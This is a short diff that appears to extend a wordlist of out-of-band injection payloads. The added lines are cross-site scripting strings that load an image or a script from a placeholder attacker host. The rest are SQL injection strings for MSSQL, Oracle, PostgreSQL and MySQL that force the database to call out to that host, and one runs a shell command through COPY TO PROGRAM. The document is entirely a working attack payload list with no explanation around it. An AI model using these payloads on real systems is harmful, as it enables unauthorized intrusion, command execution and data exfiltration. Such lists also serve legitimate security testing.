@@ -112,3 +112,11 @@ zip://domain_collab
 zip://vps_ip:80
 zlib://domain_collab
 zlib://vps_ip:80
+'\"><img src=//domain_collab/>
+'\"><img src=//vps_ip:80/oobxss.js>
+;EXEC%20master..xp_dirtree%20'%5c%5cdomain_collab%5c'+--+
+exec%20master..xp_dirtree%20'//domain_collab/a'
+||UTL_HTTP.request('http://domain_collab/')%20--%20
+copy%20(SELECT '')%20to%20program%20'nslookup%20domain_collab'
+LOAD_FILE('\\\\domain_collab\\a')
+SELECT ... INTO OUTFILE '\\\\domain_collab\a'
